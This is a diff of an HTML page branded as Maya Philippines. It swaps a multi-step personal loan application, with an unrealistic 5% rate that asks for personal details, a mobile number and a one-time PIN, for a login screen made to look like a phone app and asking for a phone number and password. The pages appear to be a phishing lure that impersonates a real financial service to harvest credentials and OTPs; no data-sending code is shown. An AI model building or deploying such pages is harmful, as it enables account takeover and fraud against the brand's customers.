@@ -1,104 +1,64 @@
 <!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Maya Philippines | Personal Loan Application</title>
-  <meta name="description" content="Apply for a Maya personal loan in the Philippines." />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="styles.css" />
-</head>
-<body>
-  <main class="app-shell">
-    <header class="site-header">
-      <a class="brand" href="#" aria-label="Maya Philippines home"><span class="brand-mark">m</span><span class="brand-word">maya</span></a>
-      <span class="secure-label">🔒 Secure application</span>
-    </header>
-
-    <div class="layout">
-      <section class="intro-panel">
-        <p class="eyebrow">MAYA PHILIPPINES</p>
-        <h1>Make your next move<br /><em>with confidence.</em></h1>
-        <p class="intro-copy">A simple, transparent way to apply for a Maya Personal Loan—right from your phone.</p>
-        <div class="intro-benefits">
-          <div><span class="benefit-icon">₱</span><p><strong>Up to ₱500,000</strong><small>Choose the amount that works for you</small></p></div>
-          <div><span class="benefit-icon">↗</span><p><strong>Flexible terms</strong><small>Repay over 6 to 60 months</small></p></div>
-          <div><span class="benefit-icon">✓</span><p><strong>5% annual interest</strong><small>Clear pricing, no surprises</small></p></div>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Maya Login</title>
+    <meta name="description" content="Maya login page" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="phone-shell">
+      <header class="status-bar" aria-label="Status bar">
+        <div class="time">1:19 PM</div>
+        <div class="status-icons" aria-hidden="true">
+          <span class="signal signal-1"></span>
+          <span class="signal signal-2"></span>
+          <span class="signal signal-3"></span>
+          <span class="signal signal-4"></span>
+          <span class="wifi"></span>
+          <span class="battery"><span class="battery-level"></span></span>
+          <span class="battery-number">15.5</span>
         </div>
-      </section>
+      </header>
 
-      <section class="application-card" aria-live="polite">
-        <div class="progress-track"><span class="progress-fill"></span></div>
-        <p class="step-count" data-step-count>Step 1 of 5</p>
+      <nav class="top-nav" aria-label="Main navigation">
+        <button class="nav-back" type="button" aria-label="Go back">←</button>
+        <button class="nav-help" type="button" aria-label="Help">
+          <span class="help-mark">?</span>
+          <span>help</span>
+        </button>
+      </nav>
 
-        <section class="step" data-step="welcome">
-          <p class="eyebrow">WELCOME TO MAYA</p>
-          <h2>Let’s get you started.</h2>
-          <p class="description">Apply for a Maya Personal Loan in a few easy steps. Have your details ready.</p>
-          <div class="info-box"><span>✓</span><p>Your information is protected with Maya’s secure application process.</p></div>
-          <button class="primary-button" type="button" data-next="loan">Start application <span>→</span></button>
-        </section>
+      <main class="login-screen">
+        <div class="brand" aria-label="Maya">maya</div>
 
-        <section class="step" data-step="loan" hidden>
-          <button class="back-button" type="button" data-back="welcome">← Back</button>
-          <p class="eyebrow">LOAN DETAILS</p><h2>How much do you need?</h2>
-          <p class="description">Choose an amount and repayment period that suits your plans.</p>
-          <div class="amount-display"><span>Loan amount</span><strong id="amount-value">₱100,000</strong></div>
-          <input id="loan-amount" class="range-input" type="range" min="10000" max="500000" step="5000" value="100000" aria-label="Loan amount" />
-          <div class="range-labels"><span>₱10,000</span><span>₱500,000</span></div>
-          <label class="field-label" for="loan-term">Payment period</label>
-          <div class="select-wrap"><select id="loan-term"><option value="6">6 months</option><option value="12">12 months</option><option value="24">24 months</option><option value="36">36 months</option><option value="48">48 months</option><option value="60">60 months</option></select></div>
-          <div class="repayment-box"><div><small>Estimated monthly payment</small><strong id="monthly-payment">₱17,083.33</strong></div><span>5% p.a.</span></div>
-          <button class="primary-button" type="button" data-next="details">Continue <span>→</span></button>
-        </section>
+        <div class="login-form" role="form" aria-label="Login form">
+          <div class="field-group phone-field">
+            <span class="country-code">+63</span>
+            <input type="tel" inputmode="numeric" placeholder="Phone number" aria-label="Phone number" />
+          </div>
 
-        <section class="step" data-step="details" hidden>
-          <button class="back-button" type="button" data-back="loan">← Back</button>
-          <p class="eyebrow">YOUR DETAILS</p><h2>Tell us about yourself.</h2>
-          <p class="description">We need a few details to review your loan application.</p>
-          <div class="field-row"><div><label class="field-label" for="first-name">First name</label><input class="field" id="first-name" type="text" autocomplete="given-name" placeholder="e.g. Maria" /></div><div><label class="field-label" for="last-name">Last name</label><input class="field" id="last-name" type="text" autocomplete="family-name" placeholder="e.g. Santos" /></div></div>
-          <label class="field-label" for="birth-date">Date of birth</label><input class="field" id="birth-date" type="date" autocomplete="bday" />
-          <label class="field-label" for="loan-purpose">Loan purpose</label><div class="select-wrap"><select class="field" id="loan-purpose"><option value="">Select a purpose</option><option>Home improvement</option><option>Education</option><option>Medical expenses</option><option>Business capital</option><option>Travel</option><option>Other personal needs</option></select></div>
-          <label class="field-label" for="monthly-income">Monthly income</label><div class="input-with-prefix"><span>₱</span><input class="field" id="monthly-income" type="number" min="1" inputmode="numeric" placeholder="e.g. 35,000" /></div>
-          <p class="error-message" data-form-error role="alert"></p>
-          <button class="primary-button" type="button" data-next="phone">Continue <span>→</span></button>
-        </section>
+          <div class="field-group password-field">
+            <label for="password">Password</label>
+            <div class="password-wrap">
+              <input id="password" type="password" placeholder="Enter password" aria-label="Password" />
+              <button type="button" class="eye-button" aria-label="Show password">
+                <span class="eye-icon" aria-hidden="true">
+                  <span class="eye-lid"></span>
+                </span>
+              </button>
+            </div>
+          </div>
 
-        <section class="step" data-step="phone" hidden>
-          <button class="back-button" type="button" data-back="details">← Back</button>
-          <p class="eyebrow">MOBILE VERIFICATION</p><h2>Verify your mobile number.</h2>
-          <p class="description">We’ll send a one-time PIN to your Maya-registered mobile number.</p>
-          <label class="field-label" for="mobile-number">Mobile number</label><div class="phone-field"><span>+63</span><input id="mobile-number" type="tel" inputmode="numeric" autocomplete="tel" placeholder="9XX XXX XXXX" /></div>
-          <p class="error-message" data-phone-error role="alert"></p>
-          <button class="primary-button" type="button" data-next="otp">Send one-time PIN <span>→</span></button>
-        </section>
+          <a href="#" class="forgot-link">Forgot your password?</a>
+        </div>
 
-        <section class="step" data-step="otp" hidden>
-          <button class="back-button" type="button" data-back="phone">← Back</button>
-          <p class="eyebrow">SECURITY CHECK</p><h2>Enter your one-time PIN.</h2>
-          <p class="description">Enter the 6-digit PIN sent to your mobile number. This keeps your application secure.</p>
-          <div class="otp-fields"><input aria-label="Digit 1" inputmode="numeric" maxlength="1" /><input aria-label="Digit 2" inputmode="numeric" maxlength="1" /><input aria-label="Digit 3" inputmode="numeric" maxlength="1" /><input aria-label="Digit 4" inputmode="numeric" maxlength="1" /><input aria-label="Digit 5" inputmode="numeric" maxlength="1" /><input aria-label="Digit 6" inputmode="numeric" maxlength="1" /></div>
-          <p class="error-message" data-otp-error role="alert"></p>
-          <button class="primary-button" type="button" data-finish>Verify and continue <span>→</span></button>
-          <p class="resend-copy">Didn’t receive it? <button type="button" class="inline-button" data-resend>Resend PIN</button><span data-resend-status></span></p>
-        </section>
-
-        <section class="step centered-step" data-step="verified" hidden>
-          <div class="success-icon">✓</div><p class="eyebrow">MOBILE VERIFIED</p><h2>Welcome to Maya.</h2><p class="description">Your details are ready. Submit your application to complete the next step.</p>
-          <button class="primary-button" type="button" data-next="success">View application status <span>→</span></button>
-        </section>
-
-        <section class="step centered-step" data-step="success" hidden>
-          <div class="success-icon">✓</div><p class="eyebrow">APPLICATION RECEIVED</p><h2>Your loan application is on its way.</h2><p class="description">Thank you for applying with Maya Philippines. We’ll review your details and notify you in the Maya app.</p>
-          <div class="reference-box"><small>Application reference</small><strong>MAYA-2026-<span id="reference-number"></span></strong></div>
-          <p class="legal-copy">Please keep your reference number for your records. Loan approval is subject to Maya’s assessment.</p>
-        </section>
-      </section>
+        <button class="login-button" type="submit">Log in</button>
+      </main>
     </div>
-    <footer>© 2026 Maya Philippines. All rights reserved. &nbsp; | &nbsp; Terms and conditions apply.</footer>
-  </main>
-  <script src="app.js"></script>
-</body>
+  </body>
 </html>
